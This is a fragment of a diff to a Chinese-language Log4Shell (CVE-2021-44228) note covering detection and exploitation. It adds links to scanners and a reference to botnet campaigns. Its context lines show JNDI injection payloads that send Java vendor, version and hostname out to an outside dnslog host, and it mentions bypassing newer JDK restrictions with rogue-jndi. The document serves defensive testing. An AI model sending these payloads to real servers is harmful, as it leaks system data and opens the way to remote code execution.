@@ -47,7 +47,8 @@ ${jndi:ldap://${sys:java.vendor}.domain/a}
 ```
 ${jndi:ldap://${sys:java.vendor}.@.${sys:java.version}.@.${hostName}.test.dnslog.cn/exp}
 ```
-
+### 其他可探测的信息
+![Image](https://pbs.twimg.com/media/FGT0Im-UcAIq7IA?format=png&name=small)
 ### 4.3 使用tomcat等可绕过高版本jdk限制的反序列化链
 可以使用 
  - [veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi)
@@ -61,8 +62,15 @@ powershell 命令：
 ```powershell
 gci 'C:\' -rec -force -include *.jar -ea 0 | foreach {select-string "JndiLookup.class" $_} | select -exp Path
 ```
+powershell 脚本
+[checkjndi.ps1](https://gist.github.com/wdormann/c609ae63a6ec8b58302b8cf377e0ef15)
 
-# log4j-fuzz-head-poc轻量级检测
+python 脚本
+[CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
+
+## 6. 其他组织的攻击活动
+- [已有10个家族的恶意样本利用Log4j2漏洞传播](https://blog.netlab.360.com/yi-jing-you-xxxge-jia-zu-de-botnetli-yong-log4shelllou-dong-chuan-bo-wei-da-bu-ding-de-gan-jin-liao/)
+# log4j1-fuzz-head-poc轻量级检测
 针对 log4j来批量fuzzz 请求头检测，有效检测一些头部存在的安全风险，nuclei默认使用interactsh的dnslog
 
 为什么用这种，这种方法也是从蜜罐中获取到攻击组织最常用的方法，简单，有效
